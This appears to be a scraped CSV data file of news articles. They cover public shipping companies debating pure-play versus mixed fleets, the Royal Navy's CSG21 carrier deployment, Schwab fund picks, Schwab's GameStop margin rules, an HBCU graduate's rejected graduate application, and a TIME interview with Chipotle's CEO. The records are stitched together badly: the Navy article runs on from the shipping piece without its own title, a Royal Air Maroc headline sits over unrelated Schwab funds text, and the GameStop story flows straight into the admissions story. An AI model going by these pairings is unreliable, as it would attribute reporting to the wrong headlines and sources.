Regarding carrier profits and freight he continued “To that end the publicly traded TL carriers saw profitability land just short of best-ever profit margins in Q3 with seasonal adjustment boosting net profits to a record 8.6% eclipsing the previous record set in Q1’21. Additionally we tend not to view freight as a backlog business but rather a real-time expression of economic activity. In this unusual period an actual freight backlog argues for strong freight fundamentals well into 2022.”",https://news.google.com/articles/CBMiZ2h0dHBzOi8vd3d3LmZyZWlnaHR3YXZlcy5jb20vbmV3cy9zaGlwcGluZy1vbi13YWxsLXN0cmVldC10aGUtcGVyZW5uaWFsLXB1cmUtcGxheS12cy1taXhlZC1mbGVldC1kZWJhdGXSAWtodHRwczovL3d3dy5mcmVpZ2h0d2F2ZXMuY29tL25ld3Mvc2hpcHBpbmctb24td2FsbC1zdHJlZXQtdGhlLXBlcmVubmlhbC1wdXJlLXBsYXktdnMtbWl4ZWQtZmxlZXQtZGViYXRlL2FtcA?hl=en-US&gl=US&ceid=US%3Aen,Shipping on Wall Street: Is it better to be a pure play or jack-of-all-trades?,"Should a public shipping company be a pure play — owning just tankers container ships bulkers or gas carriers — or should it do as the traditional private family shipowners do and own a mixed fleet?

The answer is important: It affects how attractive a shipping stock is to investors and in the case of extreme rate troughs it affects the chances a public company can avoid restructuring or insolvency.

Shipping’s pure-play-versus-mixed-fleet debate has been ongoing for more than a decade and in 2021 there have been major moves from one camp to the other.

Costamare (NYSE: CMRE) purchased another seven bulk carriers last week bringing its dry bulk fleet to 44 ships with aggregate capacity of 2.4 million deadweight tons (DWT). Sponsored by Greece’s Constantakopoulos family Costamare went public in 2016 as pure-play container-ship lessor; it now owns 77 box ships with capacity of 586000 twenty-foot equivalent units. It began diversifying into dry bulk and switched to being a mixed-fleet owner in June.

Container-ship and bulker owner Navios Partners (NYSE: NMM) completed its merger with crude- and product-tanker owner Navios Acquisition on Oct. 15. The Navios Group backed by Angeliki Frangou was once a poster child of pure plays having five separate public entities (a spiderweb of sibling listings rivaled in complexity only by the former Teekay Group family tree). Today the consolidated Navios Partners boasts 142 vessels spanning wet bulk dry bulk and box shipping and is being pitched as a unique broad-based proxy on global trade.

Evangelos Marinakis-sponsored Capital Product Partners (NYSE: CPLP) took delivery of its latest liquefied natural gas (LNG) carrier on Nov. 29. The company went public as a product-tanker owner and ultimately transformed into a nearly pure owner of container ships. It now owns 15 container ships totaling 105352 TEUs and began diversifying into LNG shipping in late August buying six LNG vessels to date for a combined $1.2 billion.

Castor Maritime (NASDAQ: CTRM) was taken public as a pure dry bulk owner by the children of former Excel Maritime boss Gabriel Panayotides. Castor began diversifying into tankers in February. It now owns nine tankers in addition to 19 bulkers.

From mixed fleets to pure plays

Decisions of large players like Costamare and Navios might suggest the public pendulum is swinging toward mixed fleets. In fact there are new pure plays as well. There’s no trend in favor of one direction or the other.





On Dec. 3 StealthGas (NASDAQ: GASS) founded by Harry Vafias spun off a separately listed entity Imperial Petroleum (NASDAQ: IMPP). StealthGas had owned 45 liquefied petroleum gas (LPG) carriers three product tankers and one crude tanker. The spinoff created two pure plays: StealthGas kept the LPG ships and Imperial took the crude and product tankers.

On Nov. 30 dry bulk owner Diana Shipping (NYSE: DSX) backed by the Palios family spun off a separately listed entity OceanPal (NASDAQ: OP). Diana put three older bulkers focused on the spot market into OceanPal with Diana remaining focused on staggered time charters for newer ships. (Diana had previously spun off pure-play Diana Containerships in 2011. That company subsequently sold its container ships and transformed into a tanker pure play in 2020 renamed Performance Shipping [NASDAQ: PSHG].)

South Africa’s Grindrod Shipping (NASDAQ: GRIN) sold its remaining product tankers in April becoming a pure play on small-size bulk carriers.

Golar LNG (NYSE: GLNG) went public as an LNG shipowner then diversified into floating liquefaction and power plants. It sold its power-plant business in April and is going back to a targeted approach with a spinoff of its LNG carrier fleet from the floating liquefaction division. Golar announced Wednesday that eight of its LNG carriers would be sold to a new entity Cool Company (CoolCo) which will raise money and list in Oslo in Q1 2022. CoolCo will be 30% owned by Golar LNG and Idan Ofer-founded Eastern Pacific will be the largest shareholder.

This year also saw huge upside from an earlier pure-play move of Aristides Pittas’ Euroseas (NASDAQ: ESEA) which originally owned both container ships and bulkers. In 2018 its bulkers were spun off in a separately listed company EuroDry (NASDAQ: EDRY) rendering Euroseas a container-ship pure play. Between Jan. 1 and Sept. 1 Euroseas’ share price more than quadrupled.

Pros and cons of pure plays

Owners with ships in a single category are viewed as more understandable and attractive to investors.

If you want to bet that container leasing rates are going up you can buy shares in a company like Euroseas Danaos (NYSE: DAC) or Global Ship Lease (NYSE: GSL). If you think rates for Capesizes (bulkers of around 180000 DWT) will rise you can buy Seanergy (NASDAQ: SHIP) which specifically pitches itself as “the only pure-play Capesize company listed in the U.S.” If you believe in Suezmaxes (crude tankers with capacity of 1 million barrels) you can buy shares of Suezmax specialist Nordic American Tankers (NYSE: NAT).

Such companies provide commoditized bets on cyclical transport demand for the underlying cargo. Management decisions are largely limited to the spot versus time-charter ratio acquisitions and divestments and financial leverage.





Basil Karatzas founder of Karatzas Marine Advisors told American Shipper “Companies focused on one sector are easier for analysts to understand and model and it makes it easier for them to target specific institutional investors. It makes it easier for investors to understand whether they’re institutional or retail.” As for pure-play companies being little more commoditized bets he noted “That’s what some investors want.”

The problem for single-segment owners comes when demand in that segment collapses. “If the market goes your way it’s a great thing. But having all of your eggs in one basket can become very very critical in a bad market” warned Karatzas.

Pros and cons of mixed fleets

The traditional private model is to own ships across multiple segments buying assets at low prices when a particular segment troughs and selling them at high prices when a particular segment peaks using proceeds from sales of high-priced ships in one segment to buy low-priced ships in another.

The loftier cycle peaks from which family fortunes are made are rare usually separated by long stretches of rate weakness. Sector diversification gives private owners a better chance to survive lengthy cyclical lows so they can still be in the game when a big boom finally strikes.

According to Karatzas “As a private shipowner you would rather be in different markets because they typically do not bottom and peak at the same time and you have more room for error.”

Evercore ISI analyst Jon Chappell told American Shipper: “We think about the publicly traded companies because that’s what we do … but in the rest of the shipping world it’s not pure plays and the guys who have done incredibly well — who are not public — trade assets around different parts of the cycle.” The model on the private side said Chappell is about “someone who made four times their money on a 4000-TEU container ship and he’s able to sell that at the peak and buy some tanker assets at what he thinks is the trough.”

Navios Partners is now the closest thing to the private model in the public arena. During the Capital Link New York Maritime Forum in October Frangou maintained that her dry bulk-tanker-container platform has created scale resilience volatility mitigation and better capital access.

She said that income from healthy segments like containers can be “redeployed to get a better entry point at lower points in the cycle” in weak segments like tankers. She also said that high charters rates for Navios Partners’ container ships effectively translate into lower breakevens for its tankers.

The question ahead is whether shipping’s stock investors who are now primarily retail investors will be attracted to this. On one hand the decisions of a CEO matter a lot more with mixed fleets than with pure plays so there’s theoretically much more potential for a “management premium.” On the other hand mixed fleets are designed to smooth out the extreme highs and lows of shipping cycles and retail investors are attracted to shipping stocks by the extreme highs of the cycles.

According to Clarksons Platou Securities “In our view the jury is still out [on mixed fleets versus pure plays]. With Navios Partners … time will tell if that larger and diversified approach captures a wider audience.”

Drivers of public fleet decisions

When the topic of pure plays versus mixed fleets is debated on shipping conference panels — which happens often year after year — the implication is that there’s one right answer for the industry and public companies should strategically gravitate toward it.

That’s not how individual management teams make fleet decisions which explains why there are some companies going one way this year and other companies going the opposite direction.

When shipping companies go public they almost always debut with a pure-play model because that’s the easiest sell. That’s generally the moment when there is the most strategic or philosophical influence on the fleet-composition question.

Over time management sees opportunities arise that may compel a switch to a mixed-fleet model. Or management may have defensive reasons to make the switch. Then after public companies have evolved away from their initial pure plays some see new opportunities to make more money by splitting off a portion of the fleet and creating a pure play yet again.

In some instances when companies go from one segment to multiple segments “they may have found a way to opportunistically buy cheap ships [and add them to the public fleet] so it’s not strategic it’s opportunistic” said Karatzas. In other cases “these situations are the product of the [original] business model failing or the execution failing. It is not engineered. It is just an emergency solution because the original plan failed.”

The decision to create Navios Partners’ unique listed dry bulk-tanker-container platform arose just months before $398 million in bond debt matured for the group’s tanker arm Navios Acquisition.

Clarksons Platou Securities analyst Omar Nokta said at the time of the deal in late August: “We view this agreement as part rescue as [Navios Partners] is effectively bailing out [Navios Acquisition] ahead of its November bond maturity and part opportunistic as [Navios Partners] is acquiring a solid tanker fleet at an ideal countercyclical time.”

While official channels rightly trumpet the many achievements of the deployment here we provide a balanced assessment of the trip which has not been entirely plain sailing.



By numbers…

Away for around 244 days the group traveled about 50000 nautical miles made visits to 42 nations and 3 territories representing 47% of the world’s population and 53% of the UK’s trading partners. 18 set-piece naval and flying exercises were conducted involving 17 other nations. There was media coverage of the group’s activities in 99 countries and in 252 languages. The group hosted 66 government ministers 106 ambassadors and around 500 senior officers of foreign militaries.

Crucially the MoD says the 3700 personnel deployed consumed 25.5 tonnes of sausages 190000 potatoes and 2.01 million eggs. (HMS Defender alone got through 55000 sausages while HMS Kent consumed just 13000). Such details may seem frivolous but do give an insight into the considerable logistical challenges of sustaining naval forces at distance.

The tailored air group embarked on the carrier flew a combined total of 4723 hours of which 3433 were by day & 1290 by night covering a total of around 100000 miles. The 18 F-35 jets of VMFA-211 and 617 Squadron flew 1278 sorties totaling more than 2200 hours in the air. Exercises were conducted with over 60 other types of aircraft and 44 combat missions were flown in support of Operation Shader/Inherent Resolve over Iraq.

The deployment saw three pre-ICO Crowsnest-equipped Merlin MK2 deployed and their first opportunity to fly together in formation an opportunity to practice airborne surveillance picture handovers a key skill for the Observers to master. Although still not formally having achieved IOC Crowsnest aircraft flew 362 hours in 179 sorties between 1st May and 22nd November. An assessment of the system’s progress to date is obviously not in the public domain but these figures would suggest a gradual ramp-up in capability but not yet offering complete round-the-clock coverage during periods of operational activity.

HMS Kent’s Wildcat helicopter one of four 815 Naval Air Squadron cabs that deployed with the group flew 239 hours and 15 minutes of sorties (the equivalent of almost ten whole days airborne). Notably the first operational firing of the Marltet missile was conducted by a Wildcat from HMS Defender in the Bay of Bengal.

The view from the bridge

As would be expected the comment from the officers leading the group has been positive and upbeat Commodore Steve Moorhouse described the trip as “challenging but a hugely successful and rewarding deployment”. It is not spin or hyperbole to say those serving have made big sacrifices and generally come through tough times with good humour. Navy Lookout spoke to the COs of the two Type 45 destroyers on their arrival in Portsmouth. When asked about their experience in the Black Sea Cdr Vince Owen CO HMS Defender said their ethos of “train hard – fight easy had paid off”. When Russian forces hounded the ship on 23 June it was “Just another Day in the Royal Navy” although he described Russian actions as “unprofessional”.

Despite the well-documented propulsion problems of the Type 45s HMS Defender sailed the furthest of any ship on the deployment traveling over 51000nm. Asked what was the secret Cdr Owen attributed the performance to the engineering excellence of his ship’s company and stated that they had not missed a single day of planned availability. Although Defender has proved to generally be the most reliable of the destroyers she did suffer at least one total electrical (and propulsion) failure on the trip demonstrating the urgent need to get these ships through the Power Improvement Package. (The first PIP for HMS Dauntless had encountered serious difficulty and has yet to leave the Cammell Laird yard on Merseyside.)

Cdr Matthew Marriott CO HMS Diamond was extremely proud of the achievements of his crew. Diamond’s most notable challenge was a major propulsion defect suffered in the Mediterranean that resulted in 6 weeks alongside in Taranto having a Gas Turbine engine replaced. Marriot took a very positive view of the situation pointing out the RN was only one of two navies that could change a GT while deployed and his MEs assisted by BAES engineers had completed the job faster than it has ever been done in the UK. While the issue necessitated a major change to Diamond’s programme Marriot said the ship had still fulfilled her main strategic objectives. She made it to Singapore for a key exercise but was unavailable to escort the carrier in the South China Sea on the outward leg although the CSG benefited from having 3 other powerful air defence ships. Diamond also suffered a further minor breakdown which necessitated time alongside in Singapore dockyard missing the Five Power Power Defence Agreement 50th anniversary fleet review.

Partnerships enhanced

Most of HMS Diamond’s battle honours from centuries past were won fighting the Dutch while HNLMS Everstsen’s were for battles with the English fleet. Having put historical rivalries aside Cdr Marriot said he enjoyed a fantastic working relationship with Evertsen’s captain and similarly close ties and mutual trust was developed with USS The Sullivans. During exercise Bersama Gold in the South China Sea Diamond met up with the Australian New Zealand and Singaporean ships. Marriot explained: “We met in the night about 0300 by 0700 we had refuelled exchanged helicopters and were in the midst of a complex in a multi-threat exercise with no integration time whatsoever. We are partners in the FPDA who are capable of entering a theatre and being combat-ready in minutes”. Similarly Diamond was impressed by the speed with which the Italian Destroyer ITS Andrea Doria was seamlessly integrated into the air defence of the carrier group during the final exercise in the Mediterranean.

This interoperability with other navies is key to the RN having a credible military effect especially in the Pacific. While it exercises frequently with NATO partners the CSG21 deployment helped build and improve the ability to integrate with forces of other nations beyond the European theatre. The visible presence even if relatively transitory demonstrates to allies and adversaries that the RN is able to turn up and contribute to combat power. Although hard to quantify exactly the strategic effect of enhanced partnerships together with the deepening integration with the USN is perhaps one of the most important achievements of the deployment.

Gash trip?

The effects of COVID around the globe impacted the deployment in many ways but most significantly it severely curtailed the opportunities to get ashore. It was galling to be alongside in exotic places most notably Japan but not be allowed ashore to explore or meet other people. The advertised “trip of a lifetime” did not come to fruition and on many occasions the ships’ companies had to make their own entertainment on board. For example HMS Diamond was kept entertained by the ship’s in-house band and held a memorable crossing the line ceremony. Improvised leisure opportunities were the order of the day – in a few places the crews were able to go ashore to secluded beaches or places where they would not interact with the local population.

Two visits to the Pacific Island of Guam provided the highlight of the deployment for many and included adventurous training opportunities. On the final leg HMS Defender visited Jordan and Barcelona while Diamond went to Crete Alicante and A Coruña and were able to have almost ‘normal’ runs ashore. Overall the trip will not be remembered especially fondly by the majority of sailors because of the extended time confined on board although there have been some definite highlights.

Painful lessons

For many casual observers the deployment will be seen as a ‘failure’ due to the loss of the F-35 jet. (Eg. no-context hatchet job by City AM) Early indications are that the accident was caused by human error. The MoD announced this week that the wreckage of the aircraft has been recovered from the seabed by a joint UK US and Italian salvage effort. Whoever leaked the footage of the accident onto social media has been arrested. There is no doubt this is an embarrassing episode and a costly error but one that will be learned from. It is a reminder of the complications and risks of naval aviation. The Fleet Air Arm lost many aircraft through accidents over the years but these airframes were generally much cheaper (even in real terms) simpler and more numerous. The problem with modern combat aircraft is that all your eggs are in a few very expensive baskets while the risk of loss through accidents remains.

Despite the dangers and risks of life at sea the professionalism of the sailors and airmen saw everyone return safely except one sailor that did not make it home. A young rating committed suicide on board HMS Kent on 10th July. This was a very traumatic event for the ship’s company and the medics who tried to treat him. The issues around mental health are a challenge that goes well beyond the navy suicide being the biggest killer of men under 45.

Delivering effect

Overall the deployment has been a success. In hard power terms the group delivered a powerful presence in the eastern Mediterranean and the Black Sea the Russians reacted strongly in these regions they would like to dominate. Carrier-based F-35s conducted combat operations over Iraq. Operations in the South China Sea demonstrated a small UK contribution to upholding international law. Despite strong rhetoric in Chinese state media prior to the deployment the response to the group’s presence appears to have been very limited and low-key. HMS Richmond conducted patrols off Korea in enforcing UN sanctions against the North Korean regime and was the only ship of the group to make a very public transit of the Taiwan Strait.

The diplomatic and economic impacts of the deployment are another major prize. Making a great first impression and promoting Britain’s political trade and military interests is a core Royal Navy function and this trip was no different although the impact may have been blunted slightly by COVID restrictions. Critics may complain at the cost to the taxpayer of sending the navy overseas but in the grand scheme of things is small change compared to the value of trade deals and the promotion of ‘brand Britain’ the CSG will help to deliver.

Global deployments of an RN task group is nothing new but CSG21 has been called “the largest in a generation” marking the end of the RN’s convalescence from the effects of the disastrous 2010 SDSR. Although the RN cannot mount deployments on this scale every year it can now be described as a carrier-centric navy and has proved it can operate anywhere although some obvious caveats notably the fragility of its destroyers and heavy reliance on allies. Future CSG deployments will see much-needed growth in capabilities particularly as the UK F-35 fleet grows and the jets have the full range of weapons integrations.

The majority of those who served on the deployment will go straight on leave for Christmas with friends and family and up to 5 weeks of well-earned rest. HMS Queen Elizabeth and her escorts will need significant maintenance and will go into Fleet Time Support Periods but will technically remain at ‘high readiness’ to deploy for most of 2022.",https://news.google.com/articles/CBMia2h0dHBzOi8vd3d3Lm1vcm9jY293b3JsZG5ld3MuY29tLzIwMjEvMTIvMzQ1OTY3L3JveWFsLWFpci1tYXJvYy1zY2hlZHVsZXMtc3BlY2lhbC1mbGlnaHRzLXRvLW1vcmUtY291bnRyaWVz0gEA?hl=en-US&gl=US&ceid=US%3Aen,Royal Air Maroc Schedules Special Flights to More Countries,Click allow to get notifications on every article we post.

Not only do people have their own investing time horizons and risk tolerances but every year new investment themes unfold that all of us must navigate in our own way. Thus our best Charles Schwab funds for 2022 have been selected for investors of all stripes whether they want to build a complete portfolio or simply fill a niche with a targeted product.

Just as we mentioned in outlining our 22 best stocks for 2022 the theme for the new year is ""anything can happen."" COVID burned most 2020 playbooks to the ground and rampant inflation took most investors by surprise in 2021. The sudden post-Thanksgiving COVID omicron scare threatened to upend things heading into 2022 – and while the variant might end up being less damaging than feared new COVID strains could cause turbulence in the coming year.

Investors have other factors to consider too. If inflation remains high in the short term but normalizes in 2022 the Fed's ""transitory"" narrative will hold and the market should rejoice. But if hyperinflation remains or worsens investors could react negatively. Same with interest rates. If there's no surprise (such as a rate hike sooner than expected) the market should continue to remain positive assuming corporate earnings and other fundamentals hold up.

One final concern for investors is valuation. Stock prices – especially in certain pockets such as large-cap tech – are quite elevated. Will they finally come back to earth in 2022 as some pundits have predicted or will momentum keep them aloft?

With these themes to consider we present our 10 best Schwab funds for 2022. This group of mutual funds and exchange-traded funds (ETFs) offers ways to participate in additional upside in stocks as well as ways to protect against potential 2022 headwinds. Also where applicable we note when Schwab offers comparable mutual funds and ETFs for the same theme.",https://news.google.com/articles/CBMieWh0dHBzOi8vd3d3LnNoYWNrbmV3cy5jb20vYXJ0aWNsZS8xMjgwNzMvc2Nod2FiLXVwZGF0ZXMtZ2FtZXN0b3AtZ21lLW1hcmdpbi1yZXF1aXJlbWVudHMtZm9yLWxvbmdzLXNob3J0cy1vcHRpb25zLXRyYWRpbmfSAYMBaHR0cHM6Ly93d3cuc2hhY2tuZXdzLmNvbS9hcnRpY2xlLzEyODA3My9zY2h3YWItdXBkYXRlcy1nYW1lc3RvcC1nbWUtbWFyZ2luLXJlcXVpcmVtZW50cy1mb3ItbG9uZ3Mtc2hvcnRzLW9wdGlvbnMtdHJhZGluZz9hbXBodG1sPTE?hl=en-US&gl=US&ceid=US%3Aen,Schwab updates GameStop (GME) margin requirements for longs shorts & options trading,"Schwab updates GameStop (GME) margin requirements for longs shorts & options trading One of the largest brokerages in America Schwab has updated their margin requirements for trading in GameStop shares.

GameStop shares have been moving around quite a bit in the past month and that increased volatility has brought with it an increase in margin requirements from one of the largest brokers in the United States. Schwab has posted an update to margin requirements for several companies' stocks including GameStop.

Here's an excerpt of the update from Schwab's brokerage client website:

The following requirements are in place for affected securities:

GME

Stock: 100% margin requirement for long positions. 300% margin requirement for short positions.

Options: Long calls long puts and covered calls are permitted. Selling short put options is permitted if you have available funds to cover the entire amount of the exercise. Selling naked calls is permitted if you have available funds for increased requirements. We continue our commitment to help investors better understand what's behind these moves and how to navigate the market impact.



We'll keep this list updated with the latest information.

Please note neither Charles Schwab & Co. nor TD Ameritrade has halted clients from buying any stocks or selling any stocks they own and neither firm has restricted executing any basic options strategies.

Schwab also increased margin requirements on trading of AMC DWAC DWACU DWACW and CAR shares but the limitations on short positions of GME and AMC were definitely of note.

First of all short put positions (bullish by nature) now have to be backed with 100% of the potential exercise value. If an individual sold a single $160 strike put contract in GameStop they would have to have the cash to back up the trade. It doesn't matter if the options contract is in or out of the money Schwab is clearly reining in excessive risk-taking with this very stringent margin requirement. There is even a 100% margin requirement for long positions in GameStop.

GameStop (GME) short sellers are also waking up to some new margin requirements over at Schwab on Monday. Shorts now need three dollars of collateral for each dollar of GME they are short. This affects the amount of margin required for selling of naked call options as well.

These changes to margin requirements shouldn't affect many long-term investors in GameStop as long as they own the shares in a cash account or are not using leverage. GameStop's initial short squeeze and the ongoing volatility in the stock would never have occurred if hedge funds didn't greedily short more than the existing float of shares. Much of the excessive risk-taking going on in shares of GameStop remains on the short side of the trade in the options and shares. Smaller retail investors tend to invest with what they have while Wall Street and hedge funds use borrowed money or stock to turn a quick profit.

We will keep an eye on other brokerages and market makers to see if this is a one-off event or the beginning of a trend. Schwab has over $7 trillion in assets under management which is a lot of bananas.

Rejection can feel like a punch to the face. For some students wanting to continue their education a high-ranking GPA and standout resume are not enough.

What You Need To Know Paul Quinn graduate Alina Connie has aspirations to become an English professor and is applying for graduate school



Despite Connie's great academic standing and recommendations Texas Women's University (TWU) instantly denied her aplication



TWU claimed the denial was due to Paul Quinn's ""quality of education""



Unfortunately events like this tend to happen frequently to HBCU students although its universities has the proper accredidation

Alina Connie finds power behind her paintbrushes.

“It’s what keeps me creative. It’s what keeps me innovative” says Connie.

When she is done with a piece there is always a meaningful and progressive message behind the artwork.

“I’d say I have an obvious theme which is body positivity women empowerment and definitely the uplifting of Black women” Connie confirmed.

Connie thinks everyone needs to have the room and skill to express themselves thoroughly. That’s why her dream is to become an English professor. In her eyes people are being conditioned to cut conversations and thoughts to 250 characters or less because of social media.

“I think that’s training people to shrink themselves and shrink their ideas into small segments. Even in the classroom with a lot of my peers they don’t like writing essays” she explained.

On paper Connie is closer to reaching a career as an educator. She just finished her undergraduate degree in mass communications at Paul Quinn a historically Black college in Dallas. It's a school she says she chose for the cultural support and it was financially better for her pockets. It takes most people four years for a bachelor's however Connie did it in three. Regardless she’s not sure what steps are next for her dream to come true even with a super solid 3.9 GPA she's proud of.

Three minutes after Connie sent her grad school application which included the GPA a resume and writing samples to Texas Woman’s University she was denied. She says she learned admission officials for TWU were questioning the quality of education at Paul Quinn.

“They never read my personal statement they never read my recommendation letters"" she said.

Needing answers after the quick denial for grad school Connie says she reached out to her alma mater about the college’s accreditation.

“Paul Quinn was as surprised as I was” she added.

Michael Sorrell is the president of Paul Quinn. He says despite the college having national accreditation and a track record of sending students to Ivy League and other elite schools Connie is not the first student coming from an HBCU who has had to deal with this.

“We have sent students to Pepperdine. We’ve sent students to Penn. We’ve sent people to George Washington and the University of Chicago” said President Sorrell.

Sorrell said other colleges and universities will get stamped by regional organizations for accreditation in addition to national. Paul Quinn just does the national.

The U.S. Department of Education views national and regional accreditation equally. It’s a conversation he volunteered to have with TWU officials after learning about Connie’s situation.

“Whenever we’re made aware of the situation we remedy it” said Sorrell regarding the instant denial.

A statement from Holly Hansen-Thomas who is vice provost and dean of the graduate school reads: ""Texas Woman’s graduate admissions policy allows the university flexibility to evaluate applicants holistically in a way that benefits TWU and is aligned with our commitment to diversity equity and inclusion. Generally speaking if a prospective graduate student holds an undergraduate degree from an institution that is not regionally accredited it is in the normal course of business for Texas Woman’s to determine whether the institution offers a credential equivalent to that of a regionally accredited institution.”

After Sorrell talked with TWU officials Connie was sent an email saying they will consider her application. While it looks like she does have a bright future ahead others in similar situations may still be in the dark if they don’t speak up.",,,,,,,,,

CMG,Chipotle Mexican Grill,https://news.google.com/articles/CBMiPWh0dHBzOi8vdGltZS5jb20vNjEyNzQxNS9icmlhbi1uaWNjb2wtY2hpcG90bGUtY2VvLWludGVydmlldy_SAQA?hl=en-US&gl=US&ceid=US%3Aen,Chipotle's CEO on Fighting the Tide of Quitting Workers: It's About More Than Higher Pay and Better Benefits,"(To receive weekly emails of conversations with the world’s top CEOs and business decisionmakers click here.)

As chief executive of Chipotle Mexican Grill Brian Niccol likes to schedule time on his packed calendar to visit the company’s restaurants and see people enjoying the food.

“I see some of these burritos and bowls that people build and I’m like that is enormous” he laughs.

Niccol has led Chipotle since March of 2018 and in that time the “fast-casual” restaurant chain has grown from 2441 locations to nearly 3000. The company’s stock has soared 443% compared with the S&P 500’s 73% rise over the same period. And between 2018 and 2020 Chipotle has more than doubled its annual net income to $355.8 million. Oddly enough Chipotle isn’t Niccol’s first stint at a Mexican themed restaurant. Prior to joining Chipotle he was Taco Bell’s CEO after serving in a number of executive roles there.

Despite Chipotle’s upward trajectory under his leadership Niccol’s tenure as chief executive hasn’t been without its challenges especially during 2021. Like many restaurant chains Chipotle has found it more difficult to hire and retain workers in a competitive labor market where employees are gaining the upper hand. In October Chipotle employees in New York staged a strike to speak out against working conditions a protest that coincided with organized walkouts this fall at companies including American Airlines General Electric John Deere Kellogg’s McDonald’s and Netflix.

Niccol acknowledged in an October earnings call with investors that many Chipotle restaurants have been “missing sales” because they’re not fully staffed. The company raised wages last summer enhanced benefits and has said it would sharpen its focus on developing talent and helping workers learn skills they need to gain job promotions. At the same time Chipotle has increased prices across its menu to help manage the higher costs of labor and food supplies.

Niccol spoke to TIME in late November about hiring and retention sustainability and one coming addition to Chipotle’s menu that really excites him.

(This interview has been condensed and edited for clarity.)

The pandemic has been a brutal time for the restaurant business and Chipotle has had to confront a lot of major issues that we’ve seen elsewhere in the economy like hiring challenges rising prices and workers quitting and striking over higher wages more flexible hours and better treatment. Not to mention customers who are sometimes on-edge and rude. How does all this look from where you sit? And how are you handling it?

Yeah there’s a lot going on right now. And there’s probably more stress or anxiety out in the marketplace than you’ve seen in the past which compounds all those things you just talked about. So the approach that we’ve taken is a simple one: We want to make decisions for our people and for our company that are consistent with our purpose and values. I’ve found that’s worked in good times and tough times. And we’re willing to learn and grow and we’ll take the feedback accordingly. From the pandemic to the tight labor market to the challenging supply chain situation we’re in we’ve just really relied on clearly communicating the decisions and making sure that those decisions were made consistent with our culture which is really grounded in values and purpose.

What’s the shorthand version of that? What are Chipotle’s values and purpose?

Our purpose is stated as cultivating a better world. And then we do that through our ability to source and provide culinary driven food with integrity. And what’s behind that is the idea of doing the right thing for our people. We’re doing the right thing for our customers and we’re doing the right thing for the planet. That’s shorthand but when we communicate it consistently that way it’s a simple thing. So if you just take that approach and people see that hey look your decision was grounded in our company culture and purpose. I think they’re comfortable with us sometimes saying look we got it 80% right. But there’s 20% we have to tweak. And I’m very transparent with that. And one thing the pandemic’s taught me is… I thought we were communicating a lot before the pandemic. Now we’re really I think communicating at a much better clip all the way down to every single restaurant.

How are you communicating differently now?

It’s the frequency of it. The good news is we’ve got all this technology that allows us to bring together all of our restaurant managers and above on a video conference or a phone conference. And we allow for Q&A in all those sessions. We were doing that probably once or twice a year. Now we’re doing it monthly. When the COVID pandemic hit [our core team was] meeting twice a day every day and then we were communicating out the next morning. So it was like we’d make decisions in the morning. We’d evaluate those decisions by the end of the day if we needed a course correct or new information came in we’d make new decisions and then communicate in the morning.

How about now? Are you still meeting that often?

Now things aren’t changing that fast anymore. But we still have these flash areas of supply chain staffing and then [new] regulations around COVID as well as COVID spikes or pullbacks have caused different operating rules that we continue to have to navigate.

It’s a tough job market for employers. How do you retain employees?

We’re always trying to figure out how we can ensure that we’re developing our people correctly and rewarding them correctly both in compensation and additional benefits. One of the biggest things that retains people at our company is the growth of our company. You can join our organization as a crew member and in short order—I think it’s in short order anyway two to three years—you find yourself as a restaurant manager. In five to seven years a multi-unit leader meaning you’re overseeing six to eight restaurants. And that’s a big job if you want to stop and think about it. It’s like each of our restaurants are doing two and a half million dollars [in average annual sales]. You get eight of those it’s a $15 $20 million business. There’s 30 to 35 employees per restaurant. So you’ve got 250 employees. That’s significant.

One of our biggest retention tools is the fact that we’re building over 200 restaurants a year. Opportunity is a very attractive retention tool. The other piece too is we provide things like debt-free degrees mental health benefits English as a second language not just for you but your extended family. The bigger we get the more good we can do. And most recently we’ve been really public about how we’re helping the local farm the small family farm. That gets people even more committed. And it makes them proud of the ingredients that we serve. There’s also the emissions-based targets that we just put out there to reduce the scope one two and three greenhouse gas emissions. I mean that matters to young people. And a lot of our employees are young folks. They’re in their 20s.

How do you make sure you’re holding on to people who might be potential store managers and more—because it’s tough for all businesses right now?

Yeah it is tough. We do this exercise where every quarter we check in from the folks that work directly with me all the way down to the restaurant which we call a four-by-four. It’s really just asking: “What are the four things you’re focused on for the business?” “What are the four things we’re focused on in developing you?” It’s a powerful tool because you take accountability then in saying how you want to grow. Your manager then is responsible to help you grow and then you’re also crystal clear on your accountabilities on performance because I think those things have to go hand in hand. I have found this over and over again. People like to be successful. They like to win. They like to know that they’ve accomplished the objective. I’ve found people really are energized when they know what results they’re accountable for. They can see the impact that they make on those results. And then they get to discuss how they’re doing against it. It’s a powerful exercise.

Clearly it’s important that Chipotle remains a fast growing company. But you have a lot of competitors that are adding more to their menus and adding more to the dining experience. How are you dealing with competitive pressures?

Look if we give a great experience for employees and we give a great experience for our customers centered on what we do uniquely which is food with integrity great culinary high customization we’ll keep winning. There aren’t many places where you can go for less than $10 and get the food that we provide. Meaning it’s clean in our opinion raised the right way and then prepared with classic culinary techniques so that you get a delicious experience. And the speed at which we do it the customization at which we do it and then the price at which we provide it that’s our offense and that’s our best defense. That’s what we stay after. It’s like I want every person when they have their experience at Chipotle to be like “God the guac is just so good.”

You mentioned earlier that a lot of your employees are young people. Other CEOs have recently noted that young workers almost require their employers to take a stance and be out front on social and political issues. Are you feeling that kind of pressure from your employees? And if so what issues has Chipotle chosen to take a stand on?

Yeah. The expectations I’ve heard from our folks—and I think it’s the right expectation—is they expect us to have a point of view on food. They expect us to have a point of view on people development or the inclusive aspect of everybody having a chance to succeed at our company. What I have found that resonates really well with our employees are the things that we can be truly authentic with and actually make an impact on. And so that’s where we spend our time. I think we’re a leader on the climate discussion. I think we’re a leader on the idea of doing the right thing for farming around regenerative farming. I think we’re a leader on doing the right thing for the food supply chain. I think we’re a leader on frankly inclusion and the diverse nature of our workforce.

How so?

I say this to everybody: There aren’t many companies where you can show up and potentially have just a high school degree or still in process of a high school degree and we will support you to get the next capability that you need whether that is some vocation community college traditional college whatever learning you want to enable you to move further along in our company. The good news is if you are passionate about our purpose and you love the idea of the restaurant business and of the culinary experiences that come with it we can put you on a path to hopefully build your capabilities to match your ambition and that’s where we spend our time.

Can you talk a little bit more about the environmental and farming work that you’re doing around sustainability and emissions reduction?

So on the farming side we buy I want to say 20 or 30 million pounds of local organic produce. The reason why that’s important? Our bonuses are tied to us growing that every year. A percentage of our bonus is tied to us making progress on this organic local food chain. And I think it’s critical that we do it.

